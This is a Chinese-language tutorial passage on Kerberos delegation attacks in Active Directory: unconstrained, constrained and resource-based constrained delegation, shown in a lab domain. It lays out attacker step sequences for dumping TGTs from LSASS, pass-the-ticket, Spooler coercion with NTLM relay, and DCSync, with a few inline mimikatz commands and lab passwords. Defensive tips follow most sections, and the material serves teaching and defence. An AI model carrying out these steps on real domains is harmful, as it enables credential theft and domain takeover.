四、域登录机制

  1. 非域控制器上登录域用户：

    • 本机向域控制器发送验证请求：验证用户提供的域账号和密码。
    • 域控制器核对 Active Directory 中的账号信息后返回结果。
    • 验证通过后，允许用户登录本机，并在本机创建用户配置文件（C:\Users\用户名）。

  2. 域用户的权限：

    • 域用户在特定计算机上的权限取决于该域账号被加入的本地组（如 Administrators、Remote Desktop Users 等），或通过域组策略分配。

  3. 加入域的过程：

    • 使用域管理员账号（如 REDTEAM\Administrator）临时授权，将计算机添加到域。
    • 此管理员账号不会与计算机绑定，之后任何域账号均可登录（除非受限）。

  4. 域账号的通用性：

    • 一旦计算机加入域，所有域账号理论上都可以登录该计算机（除非被组策略或本地策略明确拒绝）。

七、Kerberos 票据权限层级

在 Kerberos 认证体系及委派攻击中，攻击者捕获的票据类型决定了其所能模拟的用户权限和后续攻击价值。理解不同票据的权限层级，有助于判断攻击目标的优先级和利用方式。下图展示了 Kerberos 票据的权限金字塔：

7.1 各层级票据的价值说明

层级 票据类型 典型用途/价值 攻击示例
⭐⭐⭐⭐⭐ krbtgt TGT 域林最高权限，可伪造任意用户票据（黄金票据），完全控制整个域。 导出 krbtgt 哈希后制作黄金票据。
⭐⭐⭐⭐ 管理员 TGT 模拟域管理员，可访问任何域内资源，执行 DCSync。 从非约束委派主机导出 Administrator 的 TGT。
⭐⭐⭐⭐ 机器 TGT（域控） 域控机器账户默认具有 DCSync 权限，可导出所有用户哈希。 通过 Spooler 漏洞强制域控回连，导出 DC1$ 的 TGT。
⭐⭐⭐⭐ 服务 TGT（委派） 配置了约束委派的服务账号，可模拟用户访问特定服务，或用于横向移动。 利用 websec 用户的 TGT 访问其允许的后端服务。
⭐⭐⭐ 普通用户 TGT 模拟普通域用户，用于信息收集、横向移动（如该用户对某机器有本地管理员权限）。 导出 hack 的 TGT，访问其有权限的 12server1。
⭐⭐ 服务票据 TGS 仅能访问特定服务（如 cifs/DC1），无法模拟用户申请新票据，但可直接用于访问目标。 直接使用导出的 cifs 票据访问文件共享。
⭐ 其他低权限票据 权限极低，通常仅用于特定服务或本地访问。 一般无攻击价值。

7.2 攻击者视角的优先级

在各类委派攻击中，攻击者应优先关注高价值票据：

  1. krbtgt TGT：一旦获得，可直接制作黄金票据，永久后门。
  2. 域管理员 TGT：直接获得域控权限。
  3. 域控机器账户 TGT：利用 DCSync 导出所有哈希。
  4. 配置委派的服务账号 TGT：可能通过 S4U2Proxy 模拟高权限用户。
  5. 普通用户 TGT：作为横向移动的跳板，逐步提升权限。

此层级图可以帮助读者直观理解为何攻击者热衷于捕获特定票据，以及不同攻击路径的价值差异。

八、服务主体名称（SPN）与服务类型详解

在深入委派攻击之前，必须理解一个核心概念：服务主体名称（Service Principal Name，SPN）。SPN 是 Kerberos 协议中用于唯一标识网络服务的“身份证”，它直接决定了攻击者能模拟用户访问什么样的资源。

8.1 什么是 SPN？

SPN 是 Kerberos 中服务的唯一标识符，格式为：

例如：

  • cifs/DC1.redteam.club：表示 DC1 上的文件共享服务
  • http/web.redteam.club：表示 web 服务器上的 HTTP 服务
  • ldap/DC1.redteam.club：表示域控上的 LDAP 目录服务

当一个客户端（或服务）希望使用 Kerberos 访问某个服务时，它必须知道该服务的 SPN，并向 KDC 请求针对该 SPN 的服务票据。没有 SPN 的服务无法通过 Kerberos 进行身份验证（除非使用 NTLM）。

8.2 常见服务类型及其攻击价值

在域渗透中，最常用的服务类型及其对应的攻击场景如下：

服务类型 全称/作用 攻击场景
cifs Common Internet File System 访问共享文件夹（\\host\c$）、远程执行（smbexec、psexec）等。横向移动最常用。
http HTTP 服务（IIS、Web 应用） 访问 Web 应用程序，可能结合 Web 漏洞或用于中继攻击。
ldap Lightweight Directory Access Protocol 查询 Active Directory，进行域信息收集；如果获得 LDAP 票据，可用 DCSync 导出哈希。
host 主机综合服务（包括计划任务、WMI 等） 代表对该主机的完全管理权限，可用于远程执行任意命令。
rpcss RPC 服务 用于远程过程调用，常与打印机漏洞等结合。
termsrv 远程桌面服务（RDP） 获得远程桌面访问权限。
mssql Microsoft SQL Server 访问数据库，可能执行 xp_cmdshell 等操作系统命令。
wsman WinRM 服务 通过 PowerShell 远程管理（WinRM）。

在约束委派攻击中，服务账号的 msDS-AllowedToDelegateTo 属性里存储的就是允许委派的目标 SPN。攻击者需要根据这些 SPN 来选择攻击目标：例如，如果列表中包含 cifs/DC1，攻击者就能模拟管理员访问域控的共享；如果包含 ldap/DC1，则可能直接 DCSync。

8.4 SPN 与委派的关系

在委派机制中，SPN 起到了两个关键作用：

  1. 标识目标服务：约束委派的授权列表（msDS-AllowedToDelegateTo）中存储的是 SPN，指明了服务账号可以模拟用户访问哪些具体服务。
  2. 票据请求的必要条件：无论是 S4U2Self 还是 S4U2Proxy，都需要向 KDC 提供目标服务的 SPN，才能获取对应的服务票据。

为什么必须注册 SPN？
因为 Kerberos 的底层机制要求服务必须有一个唯一的 SPN，客户端（或中间服务）才能正确请求票据。如果一个账号没有被注册任何 SPN，它就无法作为 Kerberos 服务被访问，自然也谈不上委派。

8.5 小结：服务类型决定攻击路径

攻击者在规划委派攻击时，必须首先了解目标服务账号的 SPN 配置：

  • 如果账号有 cifs SPN，可以访问文件共享，进而可能通过写入启动项等方式获取 shell。
  • 如果账号有 ldap SPN，可以直接与域控通信，甚至执行 DCSync。
  • 如果账号有 host SPN，意味着可以远程管理主机，权限极高。

因此，SPN 的服务类型直接决定了攻击者能从委派中获得什么能力，这也是为什么在约束委派攻击命令中必须指定类似 cifs/DC1 的 SPN 的原因。

九、非约束委派详解

说明：本节涉及的攻击主体是配置了非约束委派的计算机（12server1、12server2）和用户 web。这些对象允许攻击者在控制它们后捕获高权限用户的 TGT。

9.1 设计初衷

非约束委派是 Kerberos 协议中最早引入的委派机制，其设计初衷是为了解决多层服务间的身份传递问题。在典型的分布式应用中，用户往往需要先访问前端服务（例如 Web 服务器），而前端服务又需要代表用户去访问后端服务（例如数据库、文件服务器等）。为了让后端服务能够基于用户的原始身份进行访问控制，就必须有一种机制将用户的身份凭证从前端传递到后端。

在 Kerberos 环境中，用户的身份由票据（Ticket）证明。如果前端服务能够获得用户的 TGT（票据授予票据），那么它就可以代表用户向 Kerberos 域控制器申请任何服务的票据，从而实现“模拟用户”访问任意后端资源。非约束委派正是为了实现这种灵活的模拟能力而设计的：当一台服务器被标记为“信任此用户作为任何服务的委派”时，域控制器在向该服务器发放服务票据的同时，会附带将用户的 TGT 也发送给服务器。这样，服务器就可以在内存中缓存用户的 TGT，后续需要访问其他服务时直接用该 TGT 请求新票据。

然而，这种设计存在明显安全缺陷：一旦服务器被攻陷，攻击者可以获取所有访问过该服务器的用户的 TGT，进而完全模拟这些用户，造成权限滥用的严重后果。正是由于非约束委派过于宽松，微软后来引入了约束委派和基于资源的约束委派，对委派的范围和目标进行限制，以降低风险。

9.2 工作原理

下图展示了非约束委派在正常情况下的工作流程：

关键点说明：

  • 步骤③：域控在返回服务票据（ST）时，额外附带了用户的TGT（票据授予票据），这是非约束委派的核心特征。
  • 步骤④：服务A将用户的TGT保存在自己的内存（lsass 进程）中，以便后续模拟该用户。
  • 步骤⑤~⑦：服务A利用缓存的TGT向域控申请访问其他服务（服务B）的票据，从而代表用户完成跨服务访问。

这种机制虽然方便了多层服务调用，但也带来了严重的安全风险：一旦服务A被攻陷，攻击者即可获取所有访问过该服务的用户的 TGT，进而模拟这些用户访问域内任何资源。

9.3 攻击流程

在域环境中，如果一台服务器（如 12server2）被配置了非约束委派，攻击者控制该服务器后，可诱导域管理员访问它，从而获取管理员的 TGT 票据，进而模拟管理员访问域内任何服务。下图展示了基于当前环境的非约束委派攻击流程：

攻击步骤详细说明：

  1. 触发条件：域管理员（REDTEAM\Administrator）使用其账号登录（如通过 WinRM、RDP）到一台配置了非约束委派的服务器（12server2）。
  2. 票据请求：服务器以管理员身份向域控（DC1）请求服务票据（ST），用于自身服务的访问。
  3. 委派检查与额外下发：域控发现服务器账号具有非约束委派属性，因此在返回服务票据（ST）的同时，将管理员的TGT（票据授予票据） 也一并发送给服务器。
  4. 缓存 TGT：服务器将管理员的 TGT 保存在内存（LSASS 进程）中，以便后续模拟该用户访问其他服务。此 TGT 的服务名称（sname）为 krbtgt/REDTEAM.COM，在导出时文件名通常包含“krbtgt”字样。
  5. 攻击者导出 TGT：攻击者由于已控制 12server2，使用工具（如 mimikatz 的 sekurlsa::tickets /export 或 Rubeus 的 dump）从 LSASS 内存中导出所有缓存的 Kerberos 票据。其中包含管理员 TGT 的文件名示例：[0;12d40]-2-0-60a10000-Administrator@krbtgt-REDTEAM.COM.kirbi。
  6. 票据传递：攻击者将导出的 TGT 注入自己的会话（例如使用 mimikatz 的 kerberos::ptt 或 Rubeus 的 ptt），使当前会话获得管理员的身份。
  7. 请求目标服务票据：攻击者利用注入的 TGT，向域控申请访问目标服务（如域控的文件共享服务 cifs/DC1.redteam.club）的票据。由于拥有管理员的 TGT，域控会返回对应的服务票据（ST2）。
  8. 访问成功：攻击者使用获得的服务票据访问目标服务，例如执行 dir \\DC1\c$，从而以管理员权限访问域控资源。后续还可使用 Mimikatz 的 lsadump::dcsync 导出域内所有用户哈希，实现完全控制。

注：导出的 TGT 实质是用户的身份凭证，其服务名称为 krbtgt/域名，攻击者利用它可以向 KDC 申请任何该用户有权访问的服务票据，这正是非约束委派攻击的核心价值。

9.4 攻击者视角与目标设定（基于当前环境）

在构建的域环境（REDTEAM）中，12server1、12server2 两台成员服务器均配置了非约束委派，且普通域用户 web 也设置了非约束委派（密码 123456）。这种多委派主体的环境为攻击者提供了多个潜在的攻击切入点。以下是攻击者在复现非约束委派攻击时应当假定的信息及可达成的目标：

9.4.1 攻击者假设掌握的信息

  • 初始立足点：假设攻击者已通过某种方式（如漏洞利用、弱口令、社会工程学等）获得了以下至少一种权限：
    • 某台委派主机的本地管理员权限，例如已控制 12server2（本地管理员密码 123456）或 12server1（本地管理员密码 456789）。
    • 某个域用户的明文密码或 NTLM 哈希，如普通用户 hack 或 test（密码均为 pass@123），或配置了非约束委派的用户 web（密码 123456）。
  • 域内委派信息：通过前期信息收集（如 BloodHound、AdFind）已知：
    • 12server1$ 和 12server2$ 的计算机账号启用了非约束委派。
    • 域用户 web 也启用了非约束委派（可能作为服务账号，注册了 SPN）。
  • 可选信息：可能已知域管理员 Administrator 或其他高权限用户的登录习惯（例如经常登录某台委派主机）。

9.4.2 可能的攻击切入点

  • 直接利用已控主机的委派属性：若已控制 12server2（或 12server1），则只需等待或诱导域管理员（REDTEAM\Administrator）登录该主机，即可捕获其 TGT——该票据被缓存到了目标主机的 LSASS 进程内存中。
  • 横向移动至另一台委派主机：若管理员更常登录 12server1 而攻击者仅控制 12server2，可尝试利用现有权限横向移动到 12server1，再捕获 TGT。
  • 利用配置了委派的用户账号：若已获得用户 web 的凭据，可尝试在其运行服务的机器上（或伪造服务）诱导高权限用户访问，从而捕获 TGT。此路径相对复杂，但仍属攻击面之一。
  • 结合其他漏洞强制高权限机器回连：若管理员长期不登录委派主机，可考虑使用打印机漏洞（SpoolSample）等强制域控制器向已控的委派主机发起认证，从而获得域控机器账户的 TGT，并利用其 DCSync 权限导出域哈希。

9.4.3 攻击者可达到的目的

  • 短期目标：获取域管理员 Administrator（或至少一个高权限域用户）的 TGT，并利用该 TGT 模拟其身份。
  • 中期目标：以域管理员权限访问域内关键资源，例如：
    • 访问域控制器的文件共享（\\DC1\c$）。
    • 使用 Mimikatz 的 lsadump::dcsync 导出域内所有用户的哈希，包括 krbtgt 账户。
  • 最终目标：完全控制整个域环境，例如：
    • 创建新的域管理员账号。
    • 部署持久化后门（如黄金票据、Skeleton Key）。
    • 窃取敏感数据或破坏域基础架构。

9.4.4 普通域用户登录场景下的价值与利用

如果登录攻击者控制的主机（如 12server2）的用户是普通域用户（例如 hack 或 test），而非域管理员，攻击者仍然可以捕获其 TGT，并且该 TGT 在攻击链中具有重要价值：

  • 身份模拟与横向移动：利用该 TGT 可以完全模拟该普通用户，进而以该用户的身份在域内进行信息收集、访问其有权限的资源。通过 BloodHound 等工具分析该用户的权限，可能发现它对其他机器（如 12server1）拥有本地管理员权限，或属于某个可远程登录到其他服务器的组。此时，攻击者可以使用该用户的 TGT 向域控请求访问目标机器的服务票据（如 CIFS、HOST），从而横向移动到那些机器，扩大控制范围。
  • 权限提升的跳板：控制更多机器后，攻击者有机会捕获更高权限用户（如域管理员）的 TGT，或者找到提权路径（例如通过该用户对某些 ACL 的写入权限）。因此，即使是普通用户的 TGT，也是攻击链中“立足→横向移动→权限提升”的关键一环，绝非无用。
  • 具体操作示例：
    • 在 12server2 上导出普通用户 hack 的 TGT。
    • 注入该 TGT 到当前会话，然后尝试访问 12server1 的 CIFS 服务：dir \\12server1\c$。
    • 如果 hack 在 12server1 上有本地管理员权限，攻击者就可以进一步在 12server1 上执行命令，甚至部署持久化后门。

通过以上方式，攻击者可以利用任何登录委派主机的用户凭证，逐步扩大战果，最终可能获取域管理员权限。因此，非约束委派攻击的威力在于“捕获一切经过的用户”，无论其权限高低。

9.5 非约束委派结合打印机漏洞（Spooler）攻击

9.5.1 前置条件

在实施该攻击前，必须满足以下条件：

  • 已控委派主机：攻击者已获得一台开启了非约束委派的服务器（如 12server2）的本地管理员权限，能够执行命令、上传工具并从 LSASS 进程中导出 Kerberos 票据。
  • 域内高权限目标：存在一台可被强制触发认证的高权限机器，通常为域控制器（DC1），且该机器未配置“敏感且不能被委派”保护（默认情况下域控机器账户未受保护）。
  • 打印服务可用：目标机器（如 DC1）的 Print Spooler 服务必须处于运行状态（Windows 默认开启），且攻击者能够通过网络访问其 RPC 接口（通常域内默认允许经过身份验证的用户调用）。
  • 有效域凭据：攻击者需要拥有至少一个有效的域用户账号（如 hack、test 或更高级别的账号）来触发 SpoolSample 漏洞，因为该漏洞利用需要经过身份验证的 RPC 调用。即使该用户权限很低，只要能够通过身份验证即可。
  • 网络连通性：攻击者可以从其控制的机器（或通过已控主机）与目标域控、委派主机之间建立网络连接，且防火墙未阻断必要的 RPC 流量。

9.5.2 原理概述

打印机漏洞（SpoolSample，也称为“打印机Bug”）利用了 Windows 打印系统远程协议（MS-RPRN）的一个功能：任何经过身份验证的用户都可以远程强制另一台机器（通常为域控制器）向任意第三台机器发起 Kerberos 或 NTLM 认证。结合非约束委派，如果攻击者控制了一台开启了非约束委派的主机（如 12server2），并强制域控制器（DC1）向该主机进行认证，那么域控制器在认证过程中会将自身的 TGT 发送给 12server2，并缓存于其 LSASS 内存中。攻击者随后可导出该 TGT，进而模拟域控制器机器账户。

虽然机器账户的权限通常低于域管理员，但在特定条件下（例如域控制器机器账户默认具有 DCSync 权限），攻击者可利用该 TGT 导出域内所有用户哈希，从而实现与域管理员等效的控制。

9.5.5 注意事项

  • 该攻击不依赖域管理员主动登录委派主机，而是通过漏洞强制高权限机器（域控）主动连接，因此即使管理员从未登录过委派主机，攻击者仍可能获得域控机器账户的 TGT。
  • 机器账户的 TGT 有效期通常为 10 小时，攻击者需在此时间内完成利用。
  • 域控机器账户默认具有 DCSync 权限，这是该攻击能够直接导出域哈希的关键。如果目标机器不是域控，则机器账户的 TGT 可能价值较低，但仍可用于横向移动。
  • 某些高级安全配置（如将域控加入“Protected Users”组或设置“账户敏感且不能被委派”）可阻止此类攻击，但默认环境中通常未启用。
  • 触发 SpoolSample 漏洞时，攻击者使用的域用户凭据可以是普通用户，无需高权限，因为 MS-RPRN 的调用仅需身份验证即可。

9.6 防御提示

  • 避免将服务器设置为非约束委派，尤其是面向管理员频繁登录的机器。
  • 启用“受保护的用户”组或设置敏感用户为“敏感且不能被委派”。
  • 监控事件 ID 4624（登录）和 4769（Kerberos 服务票据请求）以发现异常委派行为。
  • 针对打印机漏洞，可禁用 Print Spooler 服务（如果不需要），或通过组策略限制远程打印操作。
  • 将域控制器等关键机器加入“受保护的用户”组，或设置“账户敏感且不能被委派”属性，以防止机器账户被用于委派攻击。
  • 实施最小权限原则，定期检查并清理不必要的委派配置。

十、约束委派详解

说明：本节涉及的攻击主体是配置了约束委派的用户 websec。成员服务器 12server1 和 12server2 并未开启约束委派，它们只是作为潜在的目标服务主机（例如域控或其他服务器）被访问。约束委派攻击不依赖于这些主机的委派属性，而是利用 websec 账号的凭据和委派配置来模拟高权限用户访问指定服务。

10.1 设计初衷

约束委派（Constrained Delegation）是在 Windows Server 2003 中引入的，旨在解决非约束委派的安全缺陷。非约束委派允许服务模拟用户访问任何服务，一旦服务被攻陷，攻击者可获得所有访问过该服务的用户的 TGT，风险极大。约束委派通过限制服务可以模拟用户访问的具体服务（即 SPN），缩小了委派的范围，提高了安全性。

在约束委派中，域管理员可以显式配置某个服务账号（如 Web 服务）只能代表用户访问特定的后端服务（如文件服务器、数据库），而不能访问任意服务。即使该服务被攻陷，攻击者也只能模拟用户访问预先指定的服务，无法获取用户的 TGT 或模拟用户访问其他未授权的服务。

10.2 工作原理

约束委派依赖于两个 Kerberos 扩展协议：S4U2Self（Service for User to Self）和 S4U2Proxy（Service for User to Proxy）。

  • S4U2Self：允许服务代表任意用户向 KDC 请求一个可转发的服务票据（ST1），用于自身。即使该用户尚未通过 Kerberos 向此服务进行过认证，服务也能获取该用户的票据。这解决了某些协议（如 HTTP）无法直接获得用户票据的问题。
  • S4U2Proxy：在服务获得用户的 ST1 后，它可以使用该 ST1 向 KDC 请求一个用于访问特定目标服务（在委派列表中指定）的服务票据（ST2）。KDC 验证 ST1 中的用户身份，并检查服务账号是否被允许委派给目标服务，若允许则返回 ST2。

约束委派的整体流程如下：

  1. 用户通过某种方式（如 Kerberos 或 NTLM）向服务 A 发起请求。
  2. 服务 A 需要代表用户访问后端服务 B。如果用户尚未通过 Kerberos 认证到服务 A，服务 A 可调用 S4U2Self 向 KDC 请求一个针对自身的用户票据（ST1）。
  3. 服务 A 获得 ST1 后，调用 S4U2Proxy，使用 ST1 向 KDC 请求访问服务 B 的票据（ST2）。
  4. KDC 检查服务 A 的 msDS-AllowedToDelegateTo 属性，确认其是否允许委派给服务 B 的 SPN。若允许，则返回 ST2。
  5. 服务 A 使用 ST2 访问服务 B，服务 B 认为请求来自原始用户。

关键点是：服务 A 从未获得用户的 TGT，只能获得用于特定目标服务的 ST2。这大大限制了攻击者滥用服务账号的后果。

10.3 关于 ST1 与 ST2 的说明

在约束委派的描述中，我们使用了 ST1 和 ST2 来区分两个不同阶段获得的票据，它们本质上都是服务票据（TGS），但用途和属性有所区别：

术语 获取方式 用途 是否可转发 备注
ST 普通 Kerberos 客户端直接向 KDC 请求，用于访问指定服务。 通常不可转发 在非约束委派中，服务票据（ST）与 TGT 一起下发给服务。
ST1 S4U2Self 服务代表用户向 KDC 请求的针对服务自身的票据，用于证明用户正在访问该服务。 必须是可转发的 这是 S4U2Proxy 的前提，其可转发属性允许后续转换为其他服务的票据。
ST2 S4U2Proxy 服务使用 ST1 向 KDC 请求的针对目标服务（在委派列表中）的票据，用于实际访问后端服务。 通常是可转发的 最终用于访问后端服务的票据，与普通 ST 功能相同，但来源不同。

关键区别：

  • 普通 ST 是客户端主动请求的，而 ST1 和 ST2 是由服务代表用户请求的。
  • ST1 必须是可转发的，因为 S4U2Proxy 需要这个属性来生成 ST2。
  • 约束委派的整个过程中，服务从未接触用户的 TGT，这是与非约束委派的本质区别。

10.4 攻击流程

约束委派本身比非约束委派安全，但如果攻击者获得了配置了约束委派的服务账号的明文密码或 NTLM 哈希，就可以伪造 S4U 请求，以任意用户（如域管理员）的身份请求访问该服务被允许委派的目标服务。

攻击步骤概述：

  1. 攻击者通过某种方式（如密码喷洒、哈希传递、内存转储）获得配置了约束委派的服务账号（例如 websec）的密码或 NTLM 哈希。
  2. 使用该服务账号的凭据请求其 TGT（例如使用 kekeo 或 Rubeus 的 asktgt）。
  3. 利用该服务账号的 TGT，通过 S4U2Self 请求以任意高权限用户（如 Administrator）针对该服务自身的票据（ST1）。此步骤相当于“证明”该用户正在访问服务。
  4. 然后使用 S4U2Proxy，将 ST1 转换为针对允许委派的目标服务（如 cifs/DC1.redteam.club）的票据（ST2）。
  5. 将获得的 ST2 注入会话，即可直接访问目标服务。

该攻击无需高权限用户实际登录，只要攻击者有服务账号的凭据，就能模拟任意用户访问被允许的后端服务。

10.5 攻击者视角与目标设定（基于当前环境）

在当前 REDTEAM 环境中，域用户 websec 已配置了约束委派（例如允许委派给 cifs/DC1.redteam.club）。攻击者可能通过以下信息规划攻击：

10.5.1 攻击者假设掌握的信息

  • 服务账号凭据：攻击者已获得 websec 用户的明文密码（123456）或其 NTLM 哈希。
  • 委派配置：通过 BloodHound 或 AdFind 查询得知 websec 用户配置了约束委派，且 msDS-AllowedToDelegateTo 属性中包含感兴趣的 SPN，例如 cifs/DC1.redteam.club 或 ldap/DC1.redteam.club。
  • 域内信息：已知域控制器 DC1 的地址，以及目标服务（如文件共享、LDAP）的 SPN 格式。

10.5.2 攻击切入点

  • 直接模拟高权限用户访问委派服务：利用 websec 的凭据，通过 S4U2Proxy 模拟域管理员，获取访问目标服务（如 DC1 的文件共享）的票据，进而横向移动或权限提升。
  • 若委派包含 ldap 服务：可请求 LDAP 票据，进而使用 DCSync 导出所有哈希，直接获得域控权限。
  • 若委派包含其他机器服务：可模拟管理员访问该机器的 CIFS、HOST 等服务，实现远程代码执行。

10.5.3 攻击者可达到的目的

  • 短期目标：获得目标服务的访问权限（如读取域控文件）。
  • 中期目标：若目标服务为 LDAP，可利用 DCSync 导出域哈希，进而制作黄金票据或直接哈希传递。
  • 最终目标：完全控制域环境。

10.5.4 与其他攻击的关联

约束委派攻击常被用作权限维持手段：攻击者获得一个服务账号后，即使其权限不高，但若该账号配置了到高价值服务的委派，就可直接提升权限。此外，约束委派也常用于跨域信任攻击。

10.6 防御提示

  • 严格限制服务账号的委派权限：仅授予必要的目标 SPN，避免授予高权限服务（如 ldap/DC）。
  • 保护服务账号凭据：使用强密码，定期更换，避免将密码存储在脚本或配置文件中。
  • 启用“敏感且不能被委派”：对高权限用户（如域管理员）启用此属性，防止被服务账号模拟。
  • 监控异常 S4U 请求：关注事件 ID 4769（Kerberos 服务票据请求），特别是包含 S4U2Self 或 S4U2Proxy 信息的请求。
  • 定期审计委派配置：使用工具扫描域内所有配置了委派的服务账号，评估风险。

十一、基于资源的约束委派详解

说明：基于资源的约束委派（Resource-Based Constrained Delegation，RBCD）是 Windows Server 2012 引入的新特性，它将委派的配置权限从服务账号转移到了资源本身。这意味着资源（如计算机）可以自己决定哪些账号可以委派给它。攻击者如果拥有对目标计算机的写权限（如通过加入域的账号），就可以配置 RBCD，从而模拟任意用户（如域管理员）访问该计算机。

关于 Impacket 工具包：本节的复现案例中大量使用了 Impacket 工具集。Impacket 是一套用于网络协议交互的 Python 工具集，常用于渗透测试中与 Windows 域、SMB、LDAP 等服务进行交互。主要脚本包括 addcomputer.py（添加机器账号）、ntlmrelayx.py（NTLM 中继）、printerbug.py（打印机漏洞触发）、getTGT.py（请求 TGT）、getST.py（请求服务票据）、secretsdump.py（导出域哈希）、smbexec.py（远程命令执行）、rbcd.py（配置 RBCD）等。以下复现中将标注每个脚本的来源，并在命令后添加注释以便复习。

11.1 设计初衷

传统的约束委派需要域管理员权限在服务账号上配置 msDS-AllowedToDelegateTo 属性，这在大型环境中管理复杂且权限集中。RBCD 允许资源管理员（通常是计算机自身或将其加入域的用户）直接在计算机对象上配置 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，指定哪些账号可以代表其他用户访问该计算机。这降低了委派配置的门槛，但也引入了新的攻击面。

11.2 工作原理

RBCD 同样使用 S4U2Self 和 S4U2Proxy 协议，但区别在于委派检查的对象：

  • 在传统约束委派中，KDC 检查服务账号的 msDS-AllowedToDelegateTo 属性是否允许委派给目标 SPN。
  • 在 RBCD 中，KDC 检查目标计算机的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性是否允许发起委派的账号（即服务账号）代表用户访问自己。

具体流程：

  1. 攻击者控制一个账号（如机器账号 hack2026$），该账号需要对目标计算机（如 DC1$）具有写权限，以便修改其 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。
  2. 攻击者将该账号的 SID 添加到目标计算机的 RBCD 列表中。
  3. 攻击者使用该账号的 TGT，通过 S4U2Self 请求以任意高权限用户（如 Administrator）针对该账号自身的票据（ST1）。
  4. 然后使用 S4U2Proxy，将 ST1 转换为针对目标计算机的任意服务（如 cifs/DC1）的票据（ST2）。
  5. 将 ST2 注入会话，即可访问目标计算机。

关键点：RBCD 不要求服务账号本身有任何委派属性，只要目标计算机信任该账号即可。

11.3 攻击流程（复现案例）

在 REDTEAM 环境中，普通域用户 hack 可以将计算机加入域，因此对加入的计算机默认具有 mS-DS-CreatorSID 属性，即拥有对该计算机的写权限。利用这一点，攻击者可以创建新的机器账号（或使用已有账号），然后配置 RBCD 以访问域控或其他目标。

11.3.1 前置条件

  • 拥有一个可写目标计算机属性的账号：通常是将计算机加入域的用户（如 hack 将 12server2 加入域，则 hack 对 12server2$ 有写权限），或者通过域内默认策略，任何域用户都可以创建最多10个机器账号，这些机器账号对自身有写权限（NT AUTHORITY\SELF）。
  • 目标计算机：需要被攻击的机器，如域控 DC1 或成员服务器 12server2。攻击者可以修改其 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。
  • 有效的域凭据：用于添加机器账号和触发后续认证。
  • 网络连通性：能够与域控和目标计算机通信。

11.3.2 准备工作：创建专用工作目录

建议在攻击机上创建一个目录（如 ~/impacket_output）用于存放所有生成的票据和临时文件，避免污染 Impacket 脚本目录：

11.3.3 复现1：利用普通域账号提升到域本地管理员（攻击域控）

该复现结合打印机漏洞和 NTLM 中继，通过强制域控回连，修改域控的 RBCD 属性，进而获取域控权限。中继主机为攻击机（192.168.18.100）。

攻击流程图：

步骤详细说明（所有命令在攻击机 Kali 上执行，假设 Impacket 脚本在 ~/impacket/examples/）：

  1. 添加机器账号：使用 addcomputer.py 创建机器账号 hack2026$，密码 pass@123。

  2. 启动 NTLM 中继：运行 ntlmrelayx.py，将认证中继到域控的 LDAP，并指定要提权的机器账号 hack2026$（注意 $ 需要转义），同时使用 -l 指定输出目录为 ~/impacket_output。

  3. 触发打印机漏洞：运行 printerbug.py，强制域控 DC1 向攻击机（192.168.18.100）发起 SMB 认证。

  4. 中继修改 RBCD：域控的 SMB 连接被 ntlmrelayx.py 捕获并中继到 LDAP，从而将 hack2026$ 的 SID 添加到域控计算机 DC1$ 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性中。

  5. 请求机器账号 TGT：切换至专用工作目录，使用 getTGT.py 获取 hack2026$ 的 TGT。

  6. 模拟域管理员请求服务票据：使用 getST.py 以 hack2026$ 的身份模拟域管理员 Administrator，请求访问 cifs/DC1.redteam.club 的票据（ST2）。

  7. 访问域控：导出域哈希或获取 shell。

11.3.4 复现2：资源委派攻击其他域主机获取 system 权限

该复现针对普通成员服务器（如 12server2），通过查询创建者 SID，利用创建机器的用户权限配置 RBCD，进而获取该主机的 system 权限。

攻击流程图：

步骤详细说明：

  1. 查询计算机创建者：使用工具（如 ConsoleApp9.exe）查询域内计算机的 mS-DS-CreatorSID，找到目标主机 12server2 的创建者为 hack。

  2. 添加机器账号：使用 addcomputer.py 创建机器账号 hack$，密码 pass@123（如果已有可用机器账号可跳过）。

  3. 修改目标计算机的 RBCD 属性：使用 rbcd.py 将 hack$ 的 SID 添加到 12server2$ 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性中。

    或使用 Windows 工具 SharpAllowedToAct.exe：

  4. 请求机器账号 TGT：获取 hack$ 的 TGT。

  5. 模拟域管理员请求服务票据：使用 getST.py 以 hack$ 的身份模拟域管理员 Administrator，请求访问 cifs/12server2.redteam.club 的票据（ST2）。

  6. 访问目标主机：获取 12server2 的 SYSTEM shell。

11.3.5 注意事项

  • 复现1中，攻击者需要拥有一个普通域用户凭据（如 hack:pass@123），并确保域控的 Print Spooler 服务开启。
  • 复现2中，攻击者需要知道目标主机的创建者用户，并利用该用户的权限配置 RBCD。如果攻击者已控制创建者用户（如 hack），则可以直接操作。
  • 两个复现均依赖于默认的 ms-DS-MachineAccountQuota（允许域用户创建10个机器账号），若此配额为0，则无法添加机器账号。
  • 建议使用 -l 参数将 ntlmrelayx.py 生成的域信息文件重定向到专用目录，避免污染脚本目录。
  • 执行 getTGT.py 和 getST.py 前，务必先切换至工作目录（如 ~/impacket_output），并通过 export KRB5CCNAME 正确设置票据缓存路径，以便后续工具自动读取。

11.4 攻击者视角与目标设定（基于当前环境）

在当前 REDTEAM 环境中，普通域用户 hack 具有添加计算机的权限，且对 12server2 拥有写权限（因为 hack 是将 12server2 加入域的用户）。攻击者可以利用这两个复现案例进行攻击。

11.4.1 攻击者假设掌握的信息

  • 初始立足点：攻击者已获得一个普通域用户 hack 的密码（pass@123）。
  • 目标：希望获取域控 DC1 的权限，或提升至域管理员，或控制其他成员服务器（如 12server2）。
  • 写权限评估：通过 BloodHound 查询，确认 hack 对哪些计算机有写权限。已知 hack 对 12server2 有写权限；对于域控，需通过打印机漏洞中继来间接获得 RBCD 配置能力。

11.4.2 攻击切入点

  • 复现1（攻击域控）：利用打印机漏洞强制域控回连，配合 NTLM 中继修改域控的 RBCD，然后模拟域管理员访问域控。
  • 复现2（攻击成员服务器）：利用 hack 对 12server2 的写权限，直接配置 RBCD，模拟域管理员访问 12server2，获得该主机权限后，可进一步横向移动。

11.4.3 攻击者可达到的目的

  • 短期目标：获得目标计算机（如 12server2 或域控）的服务访问权限，例如文件共享或 SYSTEM shell。
  • 中期目标：若获得域控的 CIFS 访问权限，可进一步导出域哈希，进而制作黄金票据；若获得成员服务器权限，可进行横向移动，寻找提权路径。
  • 最终目标：完全控制整个域环境。

11.5 防御提示

